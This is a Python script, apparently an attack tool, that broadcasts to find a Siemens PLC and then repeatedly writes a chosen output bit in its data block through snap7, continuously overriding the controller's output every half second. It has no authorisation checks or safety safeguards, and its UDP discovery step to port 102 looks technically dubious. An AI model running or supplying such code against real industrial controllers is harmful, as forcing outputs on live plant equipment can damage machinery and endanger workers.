import snap7
import socket
import struct
import time

# Configuration
PLC_IP_ADDRESS = None  # Initially unknown, will be discovered
PLC_RACK = 0
PLC_SLOT = 1
DATA_BLOCK_NUMBER = 1  # Example: Change if your I/O data is in a different DB
OUTPUT_BYTE_OFFSET = 0  # Offset of the output byte in the DB
OUTPUT_BIT_OFFSET = 0  # Offset of the output bit within the byte (0-7)
DESIRED_OUTPUT_STATE = True  # True = ON, False = OFF
SCAN_INTERVAL = 0.5  # Time between override attempts in seconds

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by broadcasting a discovery request
    and listening for a response.  This assumes the PLC is configured to respond
    to such requests, which is not always the default.  This is a best-effort attempt.

    Returns:
        str: The PLC's IP address if found, otherwise None.
    """
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(5)  # Timeout after 5 seconds

    # Siemens PLC discovery request (modified to match Siemens format)
    discovery_message = b'\xFE\x00\x00\x09\x00\x00\xFF\x09\x00\x01'  #Siemens Discovery
    
    # Broadcast to the network (Siemens uses port 102, but discovery often responds on different port)
    sock.sendto(discovery_message, ('255.255.255.255', 102))
    
    try:
        data, addr = sock.recvfrom(1024)
        print(f"Received discovery response from: {addr[0]}")
        sock.close()  # Close the socket after receiving the response
        return addr[0]  # Return the IP address from the response
    except socket.timeout:
        print("No PLC discovery response received within timeout.")
        sock.close()
        return None


def manipulate_io_image(plc_ip, db_number, byte_offset, bit_offset, desired_state):
    """
    Manipulates a specific output bit in the I/O image of the PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
        db_number (int): The data block number containing the output.
        byte_offset (int): The byte offset within the DB.
        bit_offset (int): The bit offset within the byte (0-7).
        desired_state (bool): The desired state of the output (True = ON, False = OFF).
    """
    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, PLC_RACK, PLC_SLOT)

        # Read the current byte value from the data block
        read_data = plc.db_read(db_number, byte_offset, 1)
        current_byte = read_data[0]

        # Modify the specific bit
        if desired_state:
            new_byte = current_byte | (1 << bit_offset)  # Set the bit
        else:
            new_byte = current_byte & ~(1 << bit_offset) # Clear the bit

        # Write the modified byte back to the data block
        write_data = bytes([new_byte])  # Convert integer to bytes object
        plc.db_write(db_number, byte_offset, write_data)

        print(f"Successfully manipulated DB{db_number}.DBB{byte_offset}.{bit_offset} to {desired_state}")

        plc.disconnect()

    except Exception as e:
        print(f"Error manipulating I/O image: {e}")


if __name__ == "__main__":
    # Attempt to discover the PLC's IP address
    PLC_IP_ADDRESS = find_plc_ip()

    if not PLC_IP_ADDRESS:
        print("Could not discover PLC IP address.  Please manually set PLC_IP_ADDRESS.")
        PLC_IP_ADDRESS = input("Enter PLC IP Address: ")  # Prompt for manual entry if discovery fails
        if not PLC_IP_ADDRESS:
          print("No IP address provided, exiting")
          exit()
          
    print(f"Using PLC IP address: {PLC_IP_ADDRESS}")

    # Main loop: Continously attempt to override the output
    try:
        while True:
            manipulate_io_image(PLC_IP_ADDRESS, DATA_BLOCK_NUMBER, OUTPUT_BYTE_OFFSET, OUTPUT_BIT_OFFSET, DESIRED_OUTPUT_STATE)
            time.sleep(SCAN_INTERVAL)

    except KeyboardInterrupt:
        print("Script interrupted. Exiting.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")